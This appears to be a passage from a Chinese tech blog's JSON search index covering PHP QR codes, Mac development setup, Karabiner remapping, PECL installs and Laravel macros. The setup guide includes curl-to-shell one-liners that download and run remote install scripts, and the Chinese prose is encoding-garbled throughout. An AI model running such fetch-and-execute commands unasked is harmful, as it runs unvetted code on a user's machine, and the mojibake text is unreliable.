-&gt;setResizeToWidth(70); // è®¾ç½®äºŒç»´ç ä¸‹æ–¹çš„æ–‡å­—$label = Label::create(\"æ‰«ä¸€æ‰«\") // è®¾ç½®æ–‡å­—é¢œè‰² -&gt;setTextColor(new Color(0, 0, 0));// è¾“å‡ºäºŒç»´ç $writer = new PngWriter();$result = $writer-&gt;write($qr, $logo, $label);header(\"Content-Type: \" . $result-&gt;getMimeType());echo $result-&gt;getString(); åˆ›å»ºäºŒç»´ç æ—¶ï¼Œé™¤äº†å¯ä»¥æ”¾æ–‡æœ¬ï¼Œè¿˜å¯ä»¥æ”¾å…¥ URLã€é‚®ç®±ã€æ·±åº¦é“¾æ¥ç­‰ç­‰ã€‚ å…¶ä»–é—®é¢˜endroid/qr-code ä¼¼ä¹ä¸æ”¯æŒå¤–æ¡†ã€ç çœ¼ã€ç ç‚¹çš„è‡ªå®šä¹‰ï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹è¿™ä¸ª Issueã€‚ å‚è€ƒé“¾æ¥ generate-qr-code-php","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å‡å¦‚æˆ‘æœ‰ä¸€å°æ–°çš„ Mac","slug":"Suppose-I-have-a-new-Mac","date":"2022-02-20T11:26:13.000Z","updated":"2022-03-11T01:21:50.966Z","comments":true,"path":"Suppose-I-have-a-new-Mac/","link":"","permalink":"https://www.0x2beace.com/Suppose-I-have-a-new-Mac/","excerpt":"ä»å»å¹´å°±æƒ³å…¥æ‰‹ä¸€å°æ–°çš„MacBookProï¼Œä¸­é—´å› ä¸ºä¸€äº›åŸå› ï¼Œæ²¡æœ‰ç¬¬ä¸€æ—¶é—´é€‰æ‹©ä»å®˜ç½‘ä¸‹å•ï¼Œè€Œæ˜¯è®©æœ‹å‹å¸®å¿™ä»å…¶ä»–æ¸ é“ä»£è´­ã€‚ è¿™ä¸€ç­‰å°±æ˜¯å¥½å‡ ä¸ªæœˆï¼Œç›´åˆ°äºŒæœˆåˆæ‰æ‹¿åˆ°è´§â€¦ å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬çœŸçš„æœ‰äº†ä¸€å°æ–° Macã€‚æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œè¯·è‡ªè¡Œå‡†å¤‡ç§‘å­¦ä¸Šç½‘ç¯å¢ƒï¼Œæœ¬æ–‡ä¸ä½¿ç”¨ä»»ä½•ä»£ç†æºã€‚","text":"ä»å»å¹´å°±æƒ³å…¥æ‰‹ä¸€å°æ–°çš„MacBookProï¼Œä¸­é—´å› ä¸ºä¸€äº›åŸå› ï¼Œæ²¡æœ‰ç¬¬ä¸€æ—¶é—´é€‰æ‹©ä»å®˜ç½‘ä¸‹å•ï¼Œè€Œæ˜¯è®©æœ‹å‹å¸®å¿™ä»å…¶ä»–æ¸ é“ä»£è´­ã€‚ è¿™ä¸€ç­‰å°±æ˜¯å¥½å‡ ä¸ªæœˆï¼Œç›´åˆ°äºŒæœˆåˆæ‰æ‹¿åˆ°è´§â€¦ å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬çœŸçš„æœ‰äº†ä¸€å°æ–° Macã€‚æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œè¯·è‡ªè¡Œå‡†å¤‡ç§‘å­¦ä¸Šç½‘ç¯å¢ƒï¼Œæœ¬æ–‡ä¸ä½¿ç”¨ä»»ä½•ä»£ç†æºã€‚ è§¦æ§æ¿å’Œé”®ä½é…ç½®ä¸‰æŒ‡æ‹–ç§»Mac çš„ä¸‰æŒ‡æ‹–ç§»æ‰‹åŠ¿èƒ½å¤Ÿå¤§å¤§çš„æé«˜è§¦æ‘¸æ¿çš„ä½¿ç”¨é¢‘ç‡ï¼Œå‡å°‘è§¦æ§æ¿å·¦ä¸‹è§’æŒ‰é”®çš„å·¦é”®åŠŸèƒ½ä½¿ç”¨ï¼Œä½†é»˜è®¤æ˜¯æ²¡æœ‰å¯ç”¨çš„ã€‚ æ‰€ä»¥æˆ‘é€šå¸¸æ‹¿åˆ°ä¸€å°æ–°Mac çš„ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯æ‰“å¼€ä¸‰æŒ‡æ‹–ç§»ã€‚ æŒ‰ä»¥ä¸‹è·¯å¾„æ‰¾åˆ°å¯¹åº”çš„è®¾ç½®é¢æ¿ï¼šç³»ç»Ÿè®¾ç½®åå¥½ -&gt; è¾…åŠ©åŠŸèƒ½ -&gt; æŒ‡é’ˆé€‰é¡¹ -&gt; è§¦æ§æ¿é€‰é¡¹ ç‚¹å‡»å¯ç”¨å³å¯ã€‚ é”®ç›˜æ”¹é”®æ–°æ¬¾çš„MacBook çš„å‰ªåˆ€é”®ç›˜ï¼Œæœ‰å¥½å‡ ä¸ªä¸å¸¸ç”¨é”®å æ®äº†éå¸¸é‡è¦çš„ä½ç½®ï¼Œè¿™æ˜¯è‚¯å®šä¸èƒ½æ¥å—çš„ã€‚ å…·ä½“çš„æ”¹é”®è¿‡ç¨‹ï¼Œè¯·æŸ¥é˜…è¿™ç¯‡ç¬”è®°ã€‚ å‘½ä»¤è¡Œå·¥å…·Homebrewç»å¸¸ä¸ç»ˆç«¯æ‰“äº¤é“çš„ç”¨æˆ·ï¼Œå¯¹è¿™ä¸ªä¸€å®šä¸é™Œç”Ÿï¼Œå®ƒå°±æ˜¯ç±»ä¼¼Ubuntuä¸‹çš„ apt-get è¿™æ ·çš„åŒ…ç®¡ç†å·¥å…·ã€‚ é€šå¸¸æˆ‘éœ€è¦æ­å»ºä¸€ä¸ªå…¨æ–°çš„å¼€å‘ç¯å¢ƒæ—¶ï¼Œå®ƒä¸€å®šæ˜¯ç¬¬ä¸€ä¸ªéœ€è¦å®‰è£…çš„å·¥å…·ã€‚ æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\" å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š å‘½ä»¤ æè¿° brew search package æœç´¢è½¯ä»¶åŒ… brew install package å®‰è£…è½¯ä»¶åŒ… brew uninstall package å¸è½½è½¯ä»¶åŒ… brew list åˆ—å‡ºå·²å®‰è£…æ¸…å• brew services list åˆ—å‡ºä½¿ç”¨brew è¿è¡Œçš„æœåŠ¡ brew upgrade xxx å‡çº§è½¯ä»¶ brew info nginx æŸ¥çœ‹è½¯ä»¶åŒ…è¯¦æƒ… brew help è·å–å¸®åŠ© brew tap homebrew/php æ›´æ–°Homebrew å®‰è£…æº brew link php@7.3 æ‰‹åŠ¨åˆ›å»ºç¬¦å·é“¾æ¥Cellar brew unlink php@7.3 å–æ¶ˆé“¾æ¥ homebrew çš„é‡è¦æ€§å°±ä¸å¿…å¤šè¯´äº†ï¼ŒMac ä¸‹å¿…è£…å·¥å…·ä¹‹ä¸€ã€‚ å¦‚æœåœ¨å®‰è£…homebrew çš„è¿‡ç¨‹ä¸­ï¼Œå› ä¸ºä¼—æ‰€å‘¨çŸ¥çš„åŸå› å¯¼è‡´å®‰è£…å¤±è´¥ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢ä¸¤ç¯‡ç¬”è®°ï¼Œè¯´ä¸å®šä¼šæœ‰å¸®åŠ©ï¼š å¦‚ä½•è®©ç»ˆç«¯å‘½ä»¤èµ°ä»£ç† å¦‚ä½•è§£å†³ç±»ä¼¼ curl:(7) Failed to connect to raw.githubusercontent.com port 443:Connection refused çš„é—®é¢˜ Homebrew CaskHomebrew Caskæ‰©å±•äº†Homebrewï¼Œä½¿å¾—macOS GUI åº”ç”¨ç¨‹åºçš„å®‰è£…å’Œç®¡ç†æ›´ä¼˜é›…ã€ç®€å•å’Œå¿«é€Ÿã€‚ çœ‹çœ‹å®˜æ–¹çš„å®ä¾‹å›¾ï¼š Homebrew Cask å…ˆä¸‹è½½è½¯ä»¶åè§£å‹åˆ°ç»Ÿä¸€çš„ç›®å½•ä¸­ /opt/homebrew-cask/Caskroomï¼Œç„¶åå†è½¯é“¾åˆ° ~/Applications/ ç›®å½•ä¸‹ï¼Œçœæ‰äº†è‡ªå·±ä¸‹è½½ã€è§£å‹ã€æ‹–æ‹½å®‰è£…ç­‰æ­¥éª¤ï¼ŒåŒæ ·çš„ï¼Œå¸è½½ç›¸å½“ç®€å•å’Œå¹²å‡€ï¼Œä¸€å¥å‘½ä»¤å°±å¯ä»¥å®Œæˆã€‚ æ›´å¤šHomebrew Cask çš„ç”¨æ³•è¯·è‡ªè¡ŒæŸ¥é˜…ã€‚ zshzsh æ˜¯ä¸€ç§shellè¯­è¨€ï¼Œå…¼å®¹bashï¼Œæä¾›å¼ºå¤§çš„å‘½ä»¤è¡ŒåŠŸèƒ½ï¼Œæ¯”å¦‚tabè¡¥å…¨ï¼Œè‡ªåŠ¨çº é”™åŠŸèƒ½ç­‰ã€‚ å®‰è£… zshï¼š 1brew install zsh oh-my-zshåˆ™æ˜¯åŸºäºzsh å‘½ä»¤è¡Œï¼Œæä¾›äº†ä¸»é¢˜é…ç½®ï¼Œæ’ä»¶æœºåˆ¶ç­‰ä¾¿æ·æ“ä½œï¼Œå°†zsh å˜å¾—æ›´åŠ å¼ºå¤§ã€‚ 1sh -c &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;master&#x2F;tools&#x2F;install.sh)&quot; ä¸ªæ€§åŒ–é…ç½®ã€åˆ«åé…ç½®ã€æ’ä»¶å¯ç”¨éƒ½åœ¨ç›®å½• ~/.zshrc ä¸‹ï¼Œå¯ä»¥è‡ªè¡Œæ‰©å±•ã€‚ è®©ç»ˆç«¯èµ°ä»£ç†12345# zshecho export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 &gt;&gt; ~/.zprofile# bashecho export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 &gt;&gt; ~/.bash_profile å…¶ä»–ç¯å¢ƒå’Œæ’ä»¶Finderï¼ˆè®¿è¾¾ï¼‰é¢„è§ˆæ’ä»¶ç”¨äºFinder å¿«é€Ÿæ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼Œè¿™ä¸ªå·¥å…·çš„å®‰è£…å°±æ˜¯ä¾é Homebrew Caskã€‚ 1brew install qlcolorcode qlstephen qlmarkdown quicklook-json qlimagesize suspicious-package apparency quicklookase qlvideo qlcolorcode: ä»£ç æ–‡ä»¶é¢„è§ˆæ—¶é«˜äº® qlstephen: ä»¥çº¯æ–‡æœ¬çš„å½¢å¼é¢„è§ˆæ— æ‹“å±•åæˆ–è€…æœªçŸ¥æ‹“å±•åçš„æ–‡ä»¶ qlmarkdown: é¢„è§ˆæ¸²æŸ“åçš„ markdown æ–‡ä»¶ quicklook-json: é¢„è§ˆæ ¼å¼åŒ–åçš„ json æ–‡ä»¶ ProvisionQL: ipaæ–‡ä»¶ä¿¡æ¯å±•ç¤º QuickLookAPKï¼šapkæ–‡ä»¶ä¿¡æ¯å±•ç¤º macos æ‰©å±•macos æ‰©å±•æ˜¯zsh æä¾›çš„ä¸€ä¸ªæ§åˆ¶ç»ˆç«¯å’Œè®¿è¾¾ï¼ˆåŠŸèƒ½ä¹‹ä¸€ï¼‰çš„æ‰©å±•å·¥å…·ã€‚ å¯ç”¨æ–¹å¼å¾ˆç®€å•ï¼Œç›´æ¥ç¼–è¾‘~/.zshrcï¼Œç„¶åæ·»åŠ  macos åˆ°æ’ä»¶åˆ—è¡¨å³å¯ï¼š 123plugins&#x3D;( macos) å…¶ä¸­æœ€ä¸ºå¸¸ç”¨æ˜¯ofdå‘½ä»¤ï¼Œå°†å½“å‰shellçª—å£åœ¨è®¿è¾¾ä¸­æ‰“å¼€ã€‚ å¦ä¸€ä¸ªè¾ƒä¸ºå¸¸ç”¨çš„å‘½ä»¤æ˜¯cdfï¼Œå¯åœ¨shellä¸­ç›´æ¥è·³è½¬è‡³å½“å‰è®¿è¾¾çª—å£æ‰€åœ¨çš„è·¯å¾„ï¼ˆå¦‚æœå­˜åœ¨å¤šä¸ªè®¿è¾¾çª—å£ï¼Œé‚£ä¹ˆè·³è½¬è‡³æœ€å‰é¢çš„é‚£ä¸ªï¼‰ã€‚ å…¶ä»–å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š å‘½ä»¤ æè¿° tab åœ¨å½“å‰ç›®å½•æ‰“å¼€ä¸€ä¸ªæ–°çª—å£ split_tab åœ¨å½“å‰çª—å£æ‰“å¼€ä¸€ä¸ªæ°´å¹³çª—å£ vsplit_tab åœ¨å½“å‰çª—å£æ‰“å¼€ä¸€ä¸ªå‚ç›´çª—å£ ofd åœ¨è®¿è¾¾çª—å£ä¸­æ‰“å¼€å½“å‰ç›®å½• pfd è¿”å›æœ€å‰é¢çš„è®¿è¾¾çª—å£çš„è·¯å¾„ pfs è¿”å›å½“å‰æŸ¥æ‰¾ç¨‹åºé€‰æ‹© cdf cd åˆ°å½“å‰è®¿è¾¾çª—å£æ‰€åœ¨çš„è·¯å¾„ pushdf pushed åˆ°å½“å‰è®¿è¾¾ç›®å½• quick-look å¿«é€ŸæŸ¥çœ‹æŒ‡å®šæ–‡ä»¶ man-preview åœ¨é¢„è§ˆåº”ç”¨ç¨‹åºä¸­æ‰“å¼€ç‰¹å®šçš„æ‰‹å†Œé¡µ showfiles æ˜¾ç¤ºéšè—æ–‡ä»¶ hidefiles éšè—éšè—çš„æ–‡ä»¶ rmdsstore ä»¥é€’å½’æ–¹å¼åˆ é™¤ç›®å½•ä¸­çš„.DS_Storeæ–‡ä»¶ tmuxtmux æ˜¯ä¸€ä¸ªç»ˆç«¯ä¸‹çª—å£åˆ†å‰²çš„å·¥å…·ï¼Œæœ‰å…³å®ƒçš„å…·ä½“ä»‹ç»ï¼Œè¯·æŸ¥é˜…è¿™ç¯‡ç¬”è®°ã€‚ autojumpautojump - ç›®å½•å¿«é€Ÿè·³è½¬å‘½ä»¤è¡Œå·¥å…·ï¼Œä»æ­¤å‘Šåˆ«cd... cd...ã€‚ autojump æ˜¯ä¸€ä¸ªWindowsã€Linuxã€macOS éƒ½èƒ½ä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè¿™æ˜¯ä»…ä»‹ç»macOS çš„å®‰è£…æ–¹å¼ã€‚ 1brew install autojump ä½¿ç”¨brewå®‰è£…å®Œæˆä¹‹åï¼Œè¿˜éœ€è¦è¿›è¡Œé…ç½®ï¼Œä»¥ä¸‹æ–¹æ³•äºŒé€‰ä¸€ï¼š åœ¨ ~/.bash_profile æ–‡ä»¶ä¸­åŠ å…¥è¯­å¥ [[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.shã€‚ åœ¨ ~/.zshrc æ–‡ä»¶ä¸­ï¼Œä¿®æ”¹ plugins=(git) æ’ä»¶é…ç½®è¡Œï¼Œä»¥å¼€å¯ zsh å¯¹ autojump æ’ä»¶çš„æ”¯æŒ plugins=(git autojump)ã€‚ å…¶ä»–å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š å‘½ä»¤ æè¿° j foo è·³è½¬åˆ°åŒ…å« foo çš„ç›®å½• jc bar è·³è½¬åˆ°åŒ…å« bar çš„å­ç›®å½• jo file åœ¨è®¿è¾¾ä¸­æ‰“å¼€åŒ…å« file çš„ç›®å½• autojump â€“help æ‰“å¼€å¸®åŠ©åˆ—è¡¨ å‚è€ƒé“¾æ¥ Oh My Zsh Homebrew Homebrew Cask Quick Look plugins zsh-users MacOS plugin autojump","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"}],"tags":[]},{"title":"å¦‚ä½•è§£å†³ç±»ä¼¼ curl:(7) Failed to connect to raw.githubusercontent.com port 443:Connection refused çš„é—®é¢˜","slug":"How-to-solve-problems-like-curl-7-Failed-to-connect-to-raw-githubusercontent-com-port-443-Connection-refused","date":"2022-02-20T11:11:04.000Z","updated":"2022-03-11T01:21:50.966Z","comments":true,"path":"How-to-solve-problems-like-curl-7-Failed-to-connect-to-raw-githubusercontent-com-port-443-Connection-refused/","link":"","permalink":"https://www.0x2beace.com/How-to-solve-problems-like-curl-7-Failed-to-connect-to-raw-githubusercontent-com-port-443-Connection-refused/","excerpt":"æœ‰æ—¶ä½¿ç”¨Homebrew å®‰è£…å·¥å…·æ—¶ï¼Œä¼šå‡ºç°ç±»ä¼¼ä¸‹é¢çš„é”™è¯¯ï¼š","text":"æœ‰æ—¶ä½¿ç”¨Homebrew å®‰è£…å·¥å…·æ—¶ï¼Œä¼šå‡ºç°ç±»ä¼¼ä¸‹é¢çš„é”™è¯¯ï¼š 123sh -C &quot;Â§(curl-fsSL https: &#x2F;&#x2F;raw.githubusercontent.com&#x2F;ohmyzsh&#x2F;ohmyzsh&#x2F;master&#x2F;tools&#x2F;install.sh)&quot; curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused è¿™æ˜¯å› ä¸ºgithub çš„ä¸€äº›åŸŸåçš„ DNS è§£æè¢«æ±¡æŸ“ï¼Œå¯¼è‡´DNS è§£æè¿‡ç¨‹æ— æ³•é€šè¿‡åŸŸåå–å¾—æ­£ç¡®çš„IPåœ°å€ã€‚ è§£å†³æ–¹æ¡ˆæ‰“å¼€ https://www.ipaddress.com/ è¾“å…¥è®¿é—®ä¸äº†çš„åŸŸåï¼Œæˆ–è€…åœ¨ç»ˆç«¯ä½¿ç”¨ping å‘½ä»¤ï¼š 12345678âœ ~ ping raw.githubusercontent.comPING raw.githubusercontent.com (199.232.68.133): 56 data bytes64 bytes from 199.232.68.133: icmp_seq=0 ttl=49 time=226.190 ms64 bytes from 199.232.68.133: icmp_seq=1 ttl=49 time=325.860 msc64 bytes from 199.232.68.133: icmp_seq=2 ttl=49 time=326.362 ms64 bytes from 199.232.68.133: icmp_seq=3 ttl=49 time=277.042 ms^C--- raw.githubusercontent.com ping statistics --- æŸ¥è¯¢åˆ°æ­£ç¡®çš„åŸŸååï¼Œå°†å…¶æ·»åŠ åˆ°å¯¹åº”çš„hosts æ–‡ä»¶ä¸­å³å¯ã€‚ æ·»åŠ å®Œ hosts é…ç½®ä¹‹åï¼Œhomebrew å°±èƒ½æ­£å¸¸äº†ã€‚ å‚è€ƒè¿æ¥ å¦‚ä½•è§£å†³ç±»ä¼¼ curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused çš„é—®é¢˜","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mac å¦‚ä½•ç»™é”®ç›˜æ”¹é”®","slug":"how-to-change-the-keyboard-on-a-mac","date":"2022-02-13T09:24:33.000Z","updated":"2022-03-11T01:21:50.966Z","comments":true,"path":"how-to-change-the-keyboard-on-a-mac/","link":"","permalink":"https://www.0x2beace.com/how-to-change-the-keyboard-on-a-mac/","excerpt":"åœ¨Mac ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ Karabiner-Elements è¿›è¡Œæ”¹é”®ï¼Œå¯ä»¥åŒæ—¶ç»™ç¬”è®°æœ¬å’Œå¤–æ¥é”®ç›˜è¿›è¡Œæ”¹é”®ï¼Œéå¸¸æ–¹ä¾¿ã€‚","text":"åœ¨Mac ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ Karabiner-Elements è¿›è¡Œæ”¹é”®ï¼Œå¯ä»¥åŒæ—¶ç»™ç¬”è®°æœ¬å’Œå¤–æ¥é”®ç›˜è¿›è¡Œæ”¹é”®ï¼Œéå¸¸æ–¹ä¾¿ã€‚ ç³»ç»Ÿï¼šmacOS Monterey 12.1 å¤–æ¥é”®ç›˜ï¼šKeychron K6 ç®€å•æ”¹é”®Caps Lock é”®å æ®äº†éå¸¸é‡è¦çš„ä½ç½®ï¼Œè¿™ä¸ªæ˜¯æ²¡æœ‰åŠæ³•æ¥å—çš„ï¼Œæ‰€ä»¥éœ€è¦å°†å…¶æ›¿æ¢æˆ Control é”®ã€‚ æ‰“å¼€ Karabiner-Elementsï¼Œç»™äºˆå„ç§æˆæƒä¹‹åï¼Œç›´æ¥åœ¨ Simple modifications ä¸‹é¢ï¼Œé€‰æ‹©éœ€è¦æ›¿æ¢çš„é”®ã€‚ å¤æ‚æ”¹é”®å¤æ‚æ”¹é”®é€šå¸¸æ˜¯ä»¥ç»„åˆçš„æ–¹å¼å»ä¿®æ”¹ï¼Œå¯ä»¥åœ¨ Karabiner-Elements complex_modifications rules ä¸ŠæŸ¥æ‰¾è‡ªå·±æƒ³è¦çš„è§„åˆ™ã€‚ å› ä¸ºæˆ‘çš„å¤–æ¥é”®ç›˜æ˜¯ Keychron K6ï¼Œæ‰€ä»¥ç›´æ¥æœç´¢é”®ç›˜åç§°ï¼Œå°±å¯ä»¥çœ‹åˆ°å¾ˆå¤šå·²ç»å†™å¥½çš„è§„åˆ™ï¼Œç‚¹å‡» Importã€‚ å¯¼å…¥ä¹‹åï¼Œå¯ä»¥è‡ªè¡Œé€‰æ‹©å¯ç”¨æŸä¸ªè§„åˆ™ã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"PECL æ‰©å±•åº“å®‰è£…","slug":"PECL-extension-library-installation","date":"2022-02-12T06:44:53.000Z","updated":"2022-03-25T01:09:45.128Z","comments":true,"path":"PECL-extension-library-installation/","link":"","permalink":"https://www.0x2beace.com/PECL-extension-library-installation/","excerpt":"PECL æ‰©å±•åº“å®‰è£…é€šå¸¸å®‰è£… PHP æ‰©å±•ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š æºç ç¼–è¯‘å®‰è£… é€šè¿‡ pecl å‘½ä»¤ä¸€é”®å®‰è£…","text":"PECL æ‰©å±•åº“å®‰è£…é€šå¸¸å®‰è£… PHP æ‰©å±•ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š æºç ç¼–è¯‘å®‰è£… é€šè¿‡ pecl å‘½ä»¤ä¸€é”®å®‰è£… æºç ç¼–è¯‘å®‰è£…æºç ç¼–è¯‘å®‰è£…çš„å¥½å¤„æ˜¯æ›´çµæ´»ï¼Œå¦‚æœæœ‰è¿›ä¸€æ­¥çš„éœ€æ±‚ï¼Œå¯ä»¥æ ¹æ®å…·ä½“éœ€è¦å’Œç‰ˆæœ¬ï¼Œè°ƒæ•´ç›¸å…³ç¼–è¯‘å‚æ•°ã€‚ é€šå¸¸æ­¥éª¤å¦‚ä¸‹ï¼š ä¸‹è½½æºç  RECL GitHub ä»æºç ç¼–è¯‘å®‰è£… 123phpize &amp;&amp; \\./configure &amp;&amp; \\make &amp;&amp; sudo make install phpizeï¼šæ¥ç”Ÿæˆç¼–è¯‘æ£€æµ‹è„šæœ¬ ./configureï¼šæ¥åšç¼–è¯‘é…ç½®æ£€æµ‹ makeï¼šè¿›è¡Œç¼–è¯‘ make installï¼šè¿›è¡Œå®‰è£… å¦‚æœéœ€è¦æŒ‡å®šé…ç½®æ–‡ä»¶ä½ç½®ï¼Œå¯ä»¥å¢åŠ --with-php-config=/php-config-path å‚æ•°ã€‚ å¯ç”¨æ‰©å±• ç¼–è¯‘å®‰è£…åˆ°ç³»ç»ŸæˆåŠŸåï¼Œéœ€è¦åœ¨ php.ini ä¸­åŠ å…¥ä¸€è¡Œ extension=extension.so æ¥å¯ç”¨å¯¹åº”æ‰©å±•ã€‚ 1234extension = extension.so # å¯ä»¥æ˜¯ç»å¯¹è·¯å¾„extension = \"/php-config-path/extension.so\" PECL å‘½ä»¤è¡Œå®‰è£…PECL å‘å¸ƒæ—¶é—´é€šå¸¸æŒ‡æ™šäº GitHub å‘å¸ƒæ—¶é—´ã€‚ å¯¹äºå·²ç»æ”¶å½•åˆ° PHP å®˜æ–¹æ‰©å±•åº“çš„æ‰©å±•ï¼Œé™¤äº†æ‰‹åŠ¨ä¸‹è½½ç¼–è¯‘å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ PHP å®˜æ–¹æä¾›çš„ pecl å‘½ä»¤ï¼Œä¸€é”®ä¸‹è½½å®‰è£…ã€‚ æ›´æ–° pecl åº“ 1sudo pecl channel-update pecl.php.net ä½¿ç”¨ pecl ä¸€é”®å®‰è£…æ‰©å±• 1sudo pecl install mongodb æŸ¥çœ‹å½“å‰è¿è¡Œ php é…ç½®æ–‡ä»¶ä½ç½® 1php --ini å¯ç”¨æ‰©å±• 1234extension = extension.so # å¯ä»¥æ˜¯ç»å¯¹è·¯å¾„extension = \"/php-config-path/extension.so\" é‡å¯æœåŠ¡ 123sudo service php7.4-fpm restartphp -m | grep mongodbphp --ri mongodb","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Laravel Macro åŸºæœ¬ä½¿ç”¨","slug":"basic-use-of-laravel-macro","date":"2021-11-14T00:35:20.000Z","updated":"2021-11-14T00:35:40.721Z","comments":true,"path":"basic-use-of-laravel-macro/","link":"","permalink":"https://www.0x2beace.com/basic-use-of-laravel-macro/","excerpt":"åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¦‚æœæƒ³æ‰©å±•ä¸€ä¸ªåŸºç¡€ç±»ï¼Œé€šå¸¸çš„åšæ³•æ˜¯å…ˆç»§æ‰¿è¯¥ç±»ï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œæ‰©å±•ã€‚ è€Œæœ¬æ–‡è¦ä»‹ç»çš„å®æŒ‡ä»¤ï¼Œæ˜¯Laravel æ ¹æ®PHP çš„ç‰¹æ€§ï¼Œç¼–å†™äº†ä¸€å¥—å«åš Macroable çš„ Traitsï¼Œå¯ä»¥åœ¨ä¸ä½¿ç”¨ç»§æ‰¿çš„æƒ…å†µä¸‹è¿›è¡Œæ‰©å±•ã€‚","text":"åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¦‚æœæƒ³æ‰©å±•ä¸€ä¸ªåŸºç¡€ç±»ï¼Œé€šå¸¸çš„åšæ³•æ˜¯å…ˆç»§æ‰¿è¯¥ç±»ï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œæ‰©å±•ã€‚ è€Œæœ¬æ–‡è¦ä»‹ç»çš„å®æŒ‡ä»¤ï¼Œæ˜¯Laravel æ ¹æ®PHP çš„ç‰¹æ€§ï¼Œç¼–å†™äº†ä¸€å¥—å«åš Macroable çš„ Traitsï¼Œå¯ä»¥åœ¨ä¸ä½¿ç”¨ç»§æ‰¿çš„æƒ…å†µä¸‹è¿›è¡Œæ‰©å±•ã€‚ å¦‚ä½•ä½¿ç”¨å®šä¹‰ä¸€ä¸ªå®æŒ‡ä»¤ï¼š 123456&lt;?phpuse Illuminate\\Http\\Request;Request::macro(\"sayHi\", function ($name) &#123; echo \"Hi \" . $name . \"!\";&#125;); ä½¿ç”¨å®ƒï¼š 12345&lt;?php&lt;?phpuse Illuminate\\Http\\Request;Request::sayHi(\"Boo\"); // Hi Boo! ä¸Šé¢é‚£ä¸ªä¾‹å­éå¸¸ç®€å•ï¼Œå†æ¥çœ‹ä¸€ä¸ªå¤æ‚ä¸€äº›çš„ï¼Œå°†é›†åˆçš„æ•°ç»„å…¨éƒ¨è½¬æ¢ä¸ºå¤§å†™ï¼š 1234567891011&lt;?phpuse Illuminate\\Support\\Collection;Collection::macro('uppercase', function () &#123; // $this-&gt;items å°±ç›¸å½“äºæ˜¯é›†åˆçš„æ‰€æœ‰å…ƒç´  [\"hello\", \"world\"] return collect($this-&gt;items)-&gt;map(function ($item) &#123; return strtoupper($item); &#125;);&#125;);collect([\"hello\", \"world\"])-&gt;uppercase(); // [\"HELLO\", \"WORLD\"] å…³äºMacro çš„$thisè¿™é‡Œæœ‰å¿…è¦è¯´ä¸€ä¸‹$this çš„æŒ‡å‘ï¼Œåœ¨ä¸Šé¢é‚£ä¸ªé›†åˆçš„ç¤ºä¾‹ä¸­ï¼Œ$this å¹¶ä¸æ˜¯æŒ‡å‘å½“å‰ç±»ï¼Œè€Œæ˜¯æŒ‡å‘å½“å‰é›†åˆã€‚ è¿™æ˜¯å› ä¸ºåœ¨ Marcoable çš„æºä»£ç ä¸­ï¼Œæ˜¯å¯ä»¥çœ‹åˆ° static::$macros[$method]-&gt;bindTo($this, static::class) è¿™æ®µä»£ç ã€‚è€Œ bindTo æ˜¯æ”¹å˜ $this ä¸Šä¸‹æ–‡æŒ‡å‘çš„æ–¹æ³•ã€‚ åº”è¯¥æ”¾åœ¨å“ªé‡Œæœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥ç”¨æ¥å­˜æ”¾æœ‰å…³å®æŒ‡ä»¤çš„ä»£ç ï¼Œåˆ†åˆ«æ˜¯ï¼š åˆ©ç”¨composer è‡ªåŠ¨åŠ è½½ç¬¬ä¸€ç§æ˜¯ä½¿ç”¨é€šè¿‡ Composer autoload çš„ç®€å• PHP æ–‡ä»¶ã€‚ å¯ä»¥åœ¨app 